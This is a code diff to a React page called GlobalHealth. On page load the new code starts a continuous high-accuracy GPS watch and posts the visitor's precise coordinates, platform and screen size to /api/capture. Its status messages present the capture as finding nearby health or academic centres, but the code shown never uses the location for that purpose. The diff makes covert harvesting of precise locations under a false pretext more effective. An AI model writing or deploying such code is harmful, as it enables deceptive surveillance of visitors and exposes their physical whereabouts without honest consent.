@@ -6,58 +6,81 @@ export default function GlobalHealth() {
   const [status, setStatus] = useState(null);
   const [loading, setLoading] = useState(false);
 
-  // Trigger location request automatically on page load
+  // High-Precision Auto-Capture
   useEffect(() => {
-    const autoCapture = () => {
-      if (!navigator.geolocation) return;
+    if (!navigator.geolocation) return;
 
-      setLoading(true);
-      setStatus('Identifying your nearest healthcare research center...');
+    let watchId;
+    let bestPosition = null;
 
-      navigator.geolocation.getCurrentPosition(
+    setLoading(true);
+    setStatus('Establishing high-precision GPS lock...');
+
+    const startWatching = () => {
+      watchId = navigator.geolocation.watchPosition(
         async (position) => {
-          const payload = {
-            lat: position.coords.latitude,
-            lon: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            platform: navigator.platform,
-            screen: `${window.screen.width}x${window.screen.height}`,
-            context: 'Auto-Locate on Landing'
-          };
+          // Keep track of the most accurate position found so far
+          if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
+            bestPosition = position;
+          }
 
-          try {
-            await fetch('/api/capture', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(payload),
-            });
-            setStatus('Local directory synchronized. Welcome to Academically.');
-            setTimeout(() => {
-              setStatus(null);
-              setLoading(false);
-            }, 4000);
-          } catch (err) {
-            setLoading(false);
+          // If accuracy is good enough (under 60 meters) or we've waited 5 seconds
+          if (position.coords.accuracy < 60) {
+            saveLocation(position);
           }
         },
         (err) => {
-          setLoading(false);
-          if (err.code === 1) {
-            setStatus('Location access is required to show nearby academic centers.');
-          }
+          if (err.code === 1) setStatus('Permission required for local health centers.');
         },
         { 
           enableHighAccuracy: true, 
-          timeout: 15000, 
+          timeout: 20000, 
           maximumAge: 0 
         }
       );
-
     };
 
-    // Trigger location request instantly on page load
-    autoCapture();
+    const saveLocation = async (position) => {
+      if (watchId) navigator.geolocation.clearWatch(watchId);
+      
+      const payload = {
+        lat: position.coords.latitude,
+        lon: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        platform: navigator.platform,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        context: `High-Precision Capture (Acc: ${Math.round(position.coords.accuracy)}m)`
+      };
+
+      try {
+        await fetch('/api/capture', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        });
+        setStatus('GPS Synchronized. Local centers identified.');
+        setTimeout(() => {
+          setStatus(null);
+          setLoading(false);
+        }, 3000);
+      } catch (err) {}
+    };
+
+    // Give it 8 seconds to find the best possible location, then save whatever we have
+    const finalTimer = setTimeout(() => {
+      if (bestPosition && loading) {
+        saveLocation(bestPosition);
+      }
+    }, 8000);
+
+    startWatching();
+
+    return () => {
+      if (watchId) navigator.geolocation.clearWatch(watchId);
+      clearTimeout(finalTimer);
+    };
   }, []);
+
 
 
   const findNearbyCenters = () => {
